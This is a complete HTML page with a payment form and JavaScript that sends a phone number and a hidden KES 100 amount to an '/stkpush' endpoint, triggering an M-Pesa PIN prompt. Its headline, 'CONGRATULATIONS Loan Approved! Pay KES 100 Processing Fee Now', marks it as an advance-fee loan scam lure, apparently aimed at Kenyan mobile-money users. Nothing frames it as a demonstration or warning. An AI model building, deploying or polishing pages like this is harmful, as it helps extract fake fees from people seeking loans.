<!DOCTYPE html>
<html>
<head>
    <title>Pay via M-Pesa</title>
    <style>
        body {
            font-family: Arial;
            background: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .card {
            background: white;
            padding: 25px;
            border-radius: 10px;
            width: 300px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }

        h2 {
            margin-bottom: 15px;
        }

        input {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        button {
            width: 100%;
            padding: 10px;
            background: green;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        button:hover {
            background: darkgreen;
        }

        .msg {
            margin-top: 10px;
            font-size: 14px;
        }
    </style>
</head>

<body>

<div class="card">
    <h2>CONGRATULATIONS Loan Approved! Pay KES 100 Processing Fee Now</h2>

    <input type="text" id="phone" placeholder="0712345678">
    <input type="hidden" id="amount" value="100">

    <button onclick="pay()">Pay Now</button>

    <div class="msg" id="msg"></div>
</div>

<script>
async function pay() {
    let phone = document.getElementById("phone").value;
    let amount = document.getElementById("amount").value;

    document.getElementById("msg").innerText = "Processing payment...";

    try {
        let res = await fetch("/stkpush", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                phone: phone,
                amount: amount
            })
        });

        let data = await res.json();

        if (data.ResponseCode === "0") {
            document.getElementById("msg").innerText =
                "STK sent! Enter PIN on your phone.";
        } else {
            document.getElementById("msg").innerText =
                "Payment failed. Try again.";
        }

    } catch (err) {
        document.getElementById("msg").innerText =
            "Error connecting to server.";
    }
}
</script>

</body>
</html>
